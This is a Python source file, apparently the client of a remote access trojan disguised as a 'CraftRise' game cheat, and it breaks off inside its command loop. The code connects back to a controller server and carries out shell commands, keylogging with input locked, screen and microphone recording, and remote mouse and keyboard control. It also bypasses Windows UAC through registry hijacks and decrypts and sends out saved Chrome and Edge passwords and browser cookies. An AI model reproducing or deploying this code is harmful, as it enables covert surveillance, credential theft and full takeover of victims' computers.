import socket
import os
import time
import subprocess
import sys
import ctypes
import json
import base64
import sqlite3
import shutil
from urllib.parse import urlparse
from getpass import getuser
import psutil
import requests
import win32crypt
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import random
from datetime import datetime, timedelta
import pyaudio
import wave
from pynput.keyboard import Listener
import threading
import cv2
import numpy as np
import platform
import mss
import pickle
import struct
import zipfile
import logging
from PySide6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QPushButton, QMessageBox
from PySide6.QtGui import QColor, QPalette
from PySide6.QtCore import Qt

# Loglama ayarları
logging.basicConfig(filename='rat_client.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Ortam değişkeni ayarı
os.environ['PYTHONIOENCODING'] = 'utf-8'

try:
    import pyautogui
except ImportError:
    pyautogui = None

# Sabitler
SERVER_IP = "{IP}"
SERVER_PORT = 4443
BUFFER_SIZE = 4096 * 4
FILE_TRANSFER_KEYWORD = "FILE_TRANSFER:"
PING_KEYWORD = "PING:"
UPLOAD_KEYWORD = "UPLOAD:"
TEMP_DIR = os.path.join(os.path.expanduser('~'), 'client_temp')
os.makedirs(TEMP_DIR, exist_ok=True)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
KEYLOG_PATH = os.path.join(BASE_DIR, "keylog.txt")
SCREEN_RECORD_DIR = os.path.join(BASE_DIR, "screen")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
os.makedirs(SCREEN_RECORD_DIR, exist_ok=True)

os.makedirs(UPLOAD_DIR, exist_ok=True)

# Ekran paylaşımı için sabitler
HOST = '0.0.0.0'
VIDEO_PORT = 9999
CONTROL_PORT = 10000

# CTYPES İLE WINDOWS API TANIMLARI
user32 = ctypes.windll.user32
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_ABSOLUTE = 0x8000
MOUSEEVENTF_VIRTUALDESK = 0x4000
KEYEVENTF_KEYDOWN = 0x0000
KEYEVENTF_KEYUP = 0x0002
MOUSEEVENTF_WHEEL = 0x0800
WHEEL_DELTA = 120

SCREEN_WIDTH = user32.GetSystemMetrics(0)
SCREEN_HEIGHT = user32.GetSystemMetrics(1)

# Klavye kilitleme için BlockInput
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [ctypes.c_bool]
BlockInput.restype = ctypes.c_bool

# VK KODU EŞLEŞTİRMESİ
VK_MAP = {
    '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34, '5': 0x35,
    '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39, '0': 0x30,
    'Q': 0x51, 'W': 0x57, 'E': 0x45, 'R': 0x52, 'T': 0x54,
    'Y': 0x59, 'U': 0x55, 'I': 0x49, 'O': 0x4F, 'P': 0x50,
    'A': 0x41, 'S': 0x53, 'D': 0x44, 'F': 0x46, 'G': 0x47,
    'H': 0x48, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C,
    'Z': 0x5A, 'X': 0x58, 'C': 0x43, 'V': 0x56, 'B': 0x42,
    'N': 0x4E, 'M': 0x4D,
    'SPACE': 0x20, 'ENTER': 0x0D, 'BACKSPACE': 0x08,
    'TAB': 0x09, 'SHIFT': 0xA0, 'CTRL': 0xA2, 'ALT': 0xA4,
    'ESC': 0x1B, 'LEFT': 0x25, 'UP': 0x26, 'RIGHT': 0x27, 'DOWN': 0x28,
    '.': 0xBE, ',': 0xBC, '/': 0xBF, '\\': 0xDC, '-': 0xBD, '=': 0xBB,
}

def api_mouse_click(x, y):
    normalized_x = int(x * 65535 / SCREEN_WIDTH)
    normalized_y = int(y * 65535 / SCREEN_HEIGHT)
    user32.mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, normalized_x, normalized_y, 0, 0)
    time.sleep(0.01)
    user32.mouse_event(MOUSEEVENTF_LEFTDOWN, normalized_x, normalized_y, 0, 0)
    user32.mouse_event(MOUSEEVENTF_LEFTUP, normalized_x, normalized_y, 0, 0)
    time.sleep(0.05)
    user32.mouse_event(MOUSEEVENTF_LEFTDOWN, normalized_x, normalized_y, 0, 0)
    user32.mouse_event(MOUSEEVENTF_LEFTUP, normalized_x, normalized_y, 0, 0)
    logging.debug(f"Fare tıklaması: ({x}, {y})")

def api_mouse_wheel(delta):
    user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
    logging.debug(f"Fare tekerleği: {delta}")

def api_key_event(vk_code, event_type):
    user32.keybd_event(vk_code, 0, event_type, 0)
    logging.debug(f"Tuş olayı: VK={hex(vk_code)}, Tip={event_type}")

def api_key_press(vk_code):
    user32.keybd_event(vk_code, 0, KEYEVENTF_KEYDOWN, 0)
    time.sleep(0.01)
    user32.keybd_event(vk_code, 0, KEYEVENTF_KEYUP, 0)
    logging.debug(f"Tuş vuruşu: {vk_code}")

def show_message_box(message):
    user32.MessageBoxA(0, message.encode('utf-8'), b"Message", 0)
    logging.info(f"MessageBox gösterildi: {message}")

def lock_keyboard():
    if IsAdmin():
        success = BlockInput(True)
        if success:
            logging.info("Klavye ve fare kilitlendi.")
            return "Klavye ve fare kilitlendi."
        else:
            logging.error("Klavye kilitleme başarısız.")
            return "Klavye kilitleme başarısız."
    else:
        logging.error("Klavye kilitlemek için admin yetkisi gerekli.")
        return "Klavye kilitlemek için admin yetkisi gerekli."

def unlock_keyboard():
    if IsAdmin():
        success = BlockInput(False)
        if success:
            logging.info("Klavye ve fare kilidi kaldırıldı.")
            return "Klavye ve fare kilidi kaldırıldı."
        else:
            logging.error("Klavye kilidi kaldırma başarısız.")
            return "Klavye kilidi kaldırma başarısız."
    else:
        logging.error("Klavye kilidini kaldırmak için admin yetkisi gerekli.")
        return "Klavye kilidini kaldırmak için admin yetkisi gerekli."

def record_audio(duration, output_file):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1  # HyperX Cloud III mikrofonu mono
    RATE = 44100

    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        logging.info(f"{duration} saniye ses kaydı başladı...")
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)
        logging.info("Ses kaydı tamamlandı.")

        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(output_file, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        logging.info(f"Ses dosyası kaydedildi: {output_file}")
        return output_file
    except Exception as e:
        logging.error(f"Ses kaydı hatası: {e}")
        return None

def start_video_stream():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((HOST, VIDEO_PORT))
        s.listen(1)
        logging.info(f"[Video Sunucu] {VIDEO_PORT} portunda dinleniyor...")
        conn_v, addr_v = s.accept()
        logging.info(f"[Video Sunucu] Bağlandı: {addr_v}")
        sct = mss.mss()
        monitor = sct.monitors[1]
        while True:
            try:
                sct_img = sct.grab(monitor)
                img = np.array(sct_img)
                ret, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 50])
                frame = buffer.tobytes()
                data_size = struct.pack("L", len(frame))
                conn_v.sendall(data_size + frame)
                time.sleep(0.01)
            except Exception as e:
                logging.error(f"[Video Sunucu] Hata: {e}")
                break
    except Exception as e:
        logging.error(f"[Video Sunucu] Bağlantı hatası: {e}")
    finally:
        s.close()

def start_control_receiver():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((HOST, CONTROL_PORT))
        s.listen(1)
        logging.info(f"[Kontrol Sunucu] {CONTROL_PORT} portunda dinleniyor...")
        conn_c, addr_c = s.accept()
        logging.info(f"[Kontrol Sunucu] Bağlandı: {addr_c}")
        while True:
            try:
                data = conn_c.recv(1024)
                if not data:
                    break
                command = pickle.loads(data)
                if command['type'] == 'click':
                    api_mouse_click(command['x'], command['y'])
                    logging.info(f"[Kontrol] API Fare Tıklaması: ({command['x']}, {command['y']})")
                elif command['type'] == 'wheel':
                    api_mouse_wheel(command['delta'])
                    logging.info(f"[Kontrol] API Mouse Wheel: {command['delta']}")
                elif command['type'] == 'keypress' and command['key'] == 'enter':
                    api_key_press(0x0D)
                    logging.info("[Kontrol] API Tuş Vuruşu: Enter")
                elif command['type'] == 'keypress' and command['key'] == 'q':
                    logging.info("[Kontrol] 'q' komutu alındı. Sunucu kapanıyor...")
                    break
                elif command['type'] == 'key':
                    vk_code = command.get('vk')
                    action = command.get('action')
                    if vk_code in VK_MAP.values():
                        if action == 'down':
                            api_key_event(vk_code, KEYEVENTF_KEYDOWN)
                            logging.info(f"[Kontrol] Tuş Basıldı (VK: {hex(vk_code)})")
                        elif action == 'up':
                            api_key_event(vk_code, KEYEVENTF_KEYUP)
                            logging.info(f"[Kontrol] Tuş Bırakıldı (VK: {hex(vk_code)})")
                        elif action == 'exit':
                            logging.info("[Kontrol] Çıkış komutu alındı.")
                            break
            except Exception as e:
                logging.error(f"[Kontrol Sunucu] Hata: {e}")
                break
    except Exception as e:
        logging.error(f"[Kontrol Sunucu] Bağlantı hatası: {e}")
    finally:
        s.close()

def IsAdmin():
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def get_system_info():
    try:
        os_version = platform.system() + " " + platform.release()
        if "Windows" in os_version:
            if "10" in platform.release() and int(platform.version().split('.')[2]) >= 22000:
                os_version = "Windows 11"
            elif "6.1" in platform.version():
                os_version = "Windows 7"
            elif "6.2" in platform.version() or "6.3" in platform.version():
                os_version = "Windows 8"
        ip_address = socket.gethostbyname(socket.gethostname())
        try:
            response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
            if response.status_code == 200:
                country = response.json().get("country", "Bilinmiyor")
            else:
                country = "Bilinmiyor"
        except Exception:
            country = "Bilinmiyor"
        cpu_info = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "Bilinmiyor"
        ram_info = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        disk_info = f"{psutil.disk_usage('/').total / (1024**3):.2f} GB"
        return {
            "os": os_version,
            "ip": ip_address,
            "country": country,
            "cpu": f"{cpu_info} Çekirdek, {cpu_freq} MHz",
            "ram": ram_info,
            "disk": disk_info
        }
    except Exception as e:
        logging.error(f"Sistem bilgisi alınırken hata: {e}")
        return {"os": "Bilinmiyor", "ip": "Bilinmiyor", "country": "Bilinmiyor", "cpu": "Bilinmiyor", "ram": "Bilinmiyor", "disk": "Bilinmiyor"}

def send_system_info(conn):
    system_info = get_system_info()
    conn.send(json.dumps(system_info).encode('utf-8'))
    logging.debug("Sistem bilgileri gönderildi.")

def keylog(baglanti):
    def on_press(key):
        with open(KEYLOG_PATH, "a") as log_file:
            log_file.write(str(key) + '\n')
        logging.info(f"[Keylog] Tuş kaydedildi: {str(key)}")
    # Klavyeyi kilitle
    lock_response = lock_keyboard()
    baglanti.send(lock_response.encode("utf-8"))
    # Keylogger başlat
    listener = Listener(on_press=on_press)
    listener.start()
    time.sleep(15)
    listener.stop()
    # Klavyeyi serbest bırak
    unlock_response = unlock_keyboard()
    response = f"Keylog kaydedildi: {KEYLOG_PATH}\n{unlock_response}"
    baglanti.send(response.encode("utf-8"))
    logging.info(f"Keylog tamamlandı: {KEYLOG_PATH}")

def screen_record(baglanti):
    if pyautogui is None:
        response = "PyAutoGUI yüklü değil"
        baglanti.send(response.encode("utf-8"))
        logging.error("Screen record: PyAutoGUI yüklü değil")
        return
    resolution = pyautogui.size()
    codec = cv2.VideoWriter_fourcc(*"mp4v")
    filename = os.path.join(SCREEN_RECORD_DIR, f"recording_{int(time.time())}.mp4")
    fps = 30.0
    out = cv2.VideoWriter(filename, codec, fps, resolution)
    start_time = time.time()
    while time.time() - start_time < 15:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()
    response = send_file(baglanti, filename)
    os.remove(filename)
    baglanti.send(response.encode("utf-8"))
    logging.info(f"Ekran kaydı tamamlandı: {filename}")

def receive_upload(baglanti, header):
    try:
        parts = header.split(':')
        if len(parts) < 3 or parts[0] != 'UPLOAD':
            baglanti.send("Hata: Eksik dosya başlığı!".encode('utf-8'))
            logging.error("Upload: Eksik dosya başlığı")
            return
        file_name = parts[1]
        file_size = int(parts[2])
        file_path = os.path.join(UPLOAD_DIR, file_name)
        received_size = 0
        with open(file_path, "wb") as f:
            while received_size < file_size:
                data = baglanti.recv(BUFFER_SIZE)
                if not data:
                    break
                f.write(data)
                received_size += len(data)
        baglanti.send(f"Dosya kaydedildi: {file_path}".encode('utf-8'))
        logging.info(f"Dosya alındı: {file_path}")
    except Exception as e:
        baglanti.send(f"Dosya alma hatası: {e}".encode('utf-8'))
        logging.error(f"Dosya alma hatası: {e}")

def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'
    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path
    return None

def block_website(website, baglanti):
    try:
        parsed_url = urlparse(website)
        host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
        hosts_file_path = get_hosts_file_path()
        if hosts_file_path:
            with open(hosts_file_path, 'a') as hosts_file:
                hosts_file.write(host_entry)
            response = f"Website {website} has been blocked."
            logging.info(f"Website engellendi: {website}")
        else:
            response = "Hostfile not found or no permissions"
            logging.error("Hostfile bulunamadı veya izin yok")
    except Exception as e:
        response = f"Website engelleme hatası: {e}"
        logging.error(f"Website engelleme hatası: {e}")
    baglanti.send(response.encode("utf-8"))

def unblock_website(website, baglanti):
    try:
        website = website.replace("https://", "").replace("http://", "")
        hosts_file_path = get_hosts_file_path()
        if hosts_file_path:
            with open(hosts_file_path, 'r') as hosts_file:
                lines = hosts_file.readlines()
            filtered_lines = [line for line in lines if website not in line]
            with open(hosts_file_path, 'w') as hosts_file:
                hosts_file.writelines(filtered_lines)
            response = f"Website {website} has been unblocked."
            logging.info(f"Website engeli kaldırıldı: {website}")
        else:
            response = "Hostfile not found or no permissions"
            logging.error("Hostfile bulunamadı veya izin yok")
    except Exception as e:
        response = f"Website engel kaldırma hatası: {e}"
        logging.error(f"Website engel kaldırma hatası: {e}")
    baglanti.send(response.encode("utf-8"))

def create_temp(_dir=None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self, baglanti):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(1)
        self.baglanti = baglanti

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            logging.error(f"Master key alınırken hata: {e}")
            return None

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return ""

    def cookies(self, name, path, profile):
        response = f"Browser: {name} | Profile: {profile}\n\n"
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return "No cookies file"
        cookievault = create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
            host_key, name, path, encrypted_value, expires_utc = res
            value = self.decrypt_password(encrypted_value, self.master_key)
            if host_key and name and value != "":
                response += f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n"
        cursor.close()
        conn.close()
        os.remove(cookievault)
        return response

    def grab_cookies(self):
        cookies_data = ""
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.master_key = self.get_master_key(path + '\\Local State')
            if not self.master_key:
                continue
            for profile in self.profiles:
                try:
                    cookies_data += self.cookies(name, path, profile)
                except Exception as e:
                    logging.error(f"Cookies alınırken hata ({name}, {profile}): {e}")
        if not cookies_data:
            cookies_data = "No cookies found"
        self.baglanti.send(cookies_data.encode("utf-8"))
        logging.info("Cookies gönderildi.")

def GetSelf():
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

def uac_bypass(baglanti):
    response = ""
    if IsAdmin():
        response = "Already admin"
    else:
        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
        method = 1
        while method <= 2:
            try:
                if method == 1:
                    execute(f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    execute("computerdefaults --nouacbypass")
                    execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
                elif method == 2:
                    execute(f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    execute("fodhelper --nouacbypass")
                    execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
                if IsAdmin():
                    response = "UAC bypassed successfully"
                    break
            except Exception as e:
                response = f"UAC bypass hatası (method {method}): {e}"
                logging.error(f"UAC bypass hatası (method {method}): {e}")
            method += 1
        else:
            response = "UAC bypass failed"
    baglanti.send(response.encode("utf-8"))
    logging.info(f"UAC bypass sonucu: {response}")

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        logging.error("Chrome şifreleme anahtarı alınamadı.")
        return None

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def grab_chrome_passwords():
    key = get_encryption_key()
    if not key:
        return "No encryption key"
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    try:
        shutil.copyfile(db_path, "ChromeData.db")
    except:
        logging.error("Chrome tarayıcı tespit edilmedi.")
        return "Chrome browser not detected!"
    db = sqlite3.connect("ChromeData.db")
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = ""
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result += f"URL: {action_url}\nUsername: {username}\nPassword: {password}\n---\n"
    cursor.close()
    db.close()
    os.remove("ChromeData.db")
    logging.info("Chrome şifreleri alındı.")
    return result

def get_master_key_edge():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        logging.error("Edge şifreleme anahtarı alınamadı.")
        return None

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return "Edge < 80"

def grab_edge_passwords():
    master_key = get_master_key_edge()
    if not master_key:
        return "No master key for Edge"
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        logging.error("Edge tarayıcı tespit edilmedi.")
        return "Edge browser not detected!"
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = ""
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result += f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n---\n"
    except:
        pass
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    logging.info("Edge şifreleri alındı.")
    return result

def grab_passwords(baglanti):
    try:
        result = grab_chrome_passwords() + "\n" + grab_edge_passwords()
        if not result.strip():
            result = "No passwords found"
    except Exception as e:
        result = f"Password grabbing error: {e}"
        logging.error(f"Şifre alma hatası: {e}")
    baglanti.send(result.encode("utf-8"))
    logging.info("Şifreler gönderildi.")

def execute_command(command):
    try:
        cikti = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=10)
        response = cikti.stdout + cikti.stderr
        logging.debug(f"Komut çalıştırıldı: {command}, çıktı: {response}")
        return response if response else "Komut başarıyla çalıştı ama çıktı vermedi."
    except Exception as e:
        logging.error(f"Komut çalıştırılırken hata: {e}")
        return f"Komut çalıştırılırken hata oluştu: {e}"

def send_file(sock, file_path):
    if not os.path.exists(file_path):
        logging.error(f"Dosya bulunamadı: {file_path}")
        return f"Hata: Dosya bulunamadı: {file_path}"
    file_size = os.path.getsize(file_path)
    file_name = os.path.basename(file_path)
    header = f"{FILE_TRANSFER_KEYWORD}{file_name}:{file_size}\n"
    sock.send(header.encode("utf-8"))
    time.sleep(0.5)
    try:
        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk:
                    break
                sock.send(chunk)
        logging.info(f"Dosya gönderildi: {file_name} ({file_size} bayt)")
        return f"Dosya '{file_name}' ({file_size} bayt) başarıyla gönderildi."
    except Exception as e:
        logging.error(f"Dosya gönderme hatası: {e}")
        return f"Dosya gönderme hatası: {e}"

def zip_directory(dir_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), dir_path))
    logging.info(f"Dizin zip'lendi: {zip_path}")

class ClientGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.load_settings()
        self.setWindowTitle("craftRise")
        self.resize(self.settings["width"], self.settings["height"])
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(self.settings["background_color"]))
        self.setPalette(palette)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        header_label = QLabel(self.settings["header_text"])
        header_label.setStyleSheet("color: white; font-size: 12px;")
        header_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(header_label)

        for btn_text in self.settings["buttons"]:
            btn = QPushButton(btn_text.strip())
            btn.clicked.connect(lambda _, text=btn_text.strip(): self.on_button_click(text))
            btn.setStyleSheet("background-color: #CC0000; color: white; padding: 10px;")
            layout.addWidget(btn)

        layout.addStretch()

    def load_settings(self):
        try:
            with open("client_settings.json", "r") as f:
                self.settings = json.load(f)
        except FileNotFoundError:
            self.settings = {
                "width": 400,
                "height": 300,
                "background_color": "#000000",
                "header_text": "CraftRise",
                "buttons": ["auto clicker", "wall hack", "invisibility"]
            }
            logging.info("Varsayılan ayarlar yüklendi.")

    def on_button_click(self, text):
        QMessageBox.information(self, "Bilgi", f"Başlatılıyor {text}")

def main():
    # Ekran paylaşımı thread'lerini bir kez başlat
    video_thread = threading.Thread(target=start_video_stream, daemon=True)
    control_thread = threading.Thread(target=start_control_receiver, daemon=True)
    video_thread.start()
    control_thread.start()
    logging.info("Video ve kontrol thread'leri başlatıldı.")

    while True:
        baglanti = None
        try:
            baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            baglanti.settimeout(10)
            logging.info(f"Sunucuya bağlanılıyor: {SERVER_IP}:{SERVER_PORT}")
            baglanti.connect((SERVER_IP, SERVER_PORT))
            logging.info("Bağlantı başarılı!")
            baglanti.settimeout(None)

            # İlk bağlantı mesajı ve sistem bilgileri
            baglanti.send(f"--- Bağlantı kuruldu. Mevcut Dizin: {os.getcwd()} ---\n".encode("utf-8"))
            send_system_info(baglanti)
            authority = "Admin" if IsAdmin() else "Normal Kullanıcı"
            baglanti.send(f"Yetki: {authority}".encode("utf-8"))
            logging.debug(f"Yetki gönderildi: {authority}")

            while True:
                try:
                    baglanti.settimeout(10)  # Komut beklerken kısa timeout
                    kod = baglanti.recv(BUFFER_SIZE).decode("utf-8").strip()
                    baglanti.settimeout(None)
                    logging.debug(f"Alınan komut: {kod}")

                    if not kod:
                        logging.warning("Sunucudan veri gelmiyor, bağlantı kesildi.")
                        break

                    if kod.startswith(PING_KEYWORD):
                        baglanti.send("PONG".encode("utf-8"))
                        logging.debug("Ping alındı, PONG gönderildi.")
                        continue

                    if kod.startswith(UPLOAD_KEYWORD):
                        receive_upload(baglanti, kod)
                        continue

                    komut_parcalari = kod.split(' ', 1)
                    ana_komut = komut_parcalari[0].lower()
                    arguman = komut_parcalari[1] if len(komut_parcalari) > 1 else ""

                    response = ""

                    if ana_komut == "kapat":
                        response = "Kapatma komutu alındı."
                        baglanti.send(response.encode("utf-8"))
                        logging.info("Kapatma komutu alındı, çıkış yapılıyor.")
                        baglanti.close()
                        sys.exit(0)

                    elif ana_komut == "keylog":
                        threading.Thread(target=keylog, args=(baglanti,), daemon=True).start()
                        response = "Keylogger başlatıldı, klavye kilitlendi."
                        baglanti.send(response.encode("utf-8"))
                        continue

                    elif ana_komut == "lock_keyboard":
                        response = lock_keyboard()
                        baglanti.send(response.encode("utf-8"))
                        continue

                    elif ana_komut == "unlock_keyboard":
                        response = unlock_keyboard()
                        baglanti.send(response.encode("utf-8"))
                        continue

                    elif ana_komut == "screen_record":
                        screen_record(baglanti)
                        continue

                    elif ana_komut == "record_audio_30s":
                        output_file = os.path.join(TEMP_DIR, f"audio_30s_{int(time.time())}.wav")
                        kayit_dosyasi = record_audio(30, output_file)
                        if kayit_dosyasi:
                            response = send_file(baglanti, kayit_dosyasi)
                            os.remove(kayit_dosyasi)  # Geçici dosyayı sil
                            baglanti.send(response.encode("utf-8"))
                            logging.info(f"Ses kaydı (30s) gönderildi: {output_file}")
                        else:
                            response = "Ses kaydı hatası!"
                            baglanti.send(response.encode("utf-8"))
                            logging.error("Ses kaydı (30s) başarısız.")

                    elif ana_komut == "record_audio_30m":
                        output_file = os.path.join(TEMP_DIR, f"audio_30m_{int(time.time())}.wav")
                        kayit_dosyasi = record_audio(1800, output_file)  # 30 dakika = 1800 saniye
                        if kayit_dosyasi:
                            response = send_file(baglanti, kayit_dosyasi)
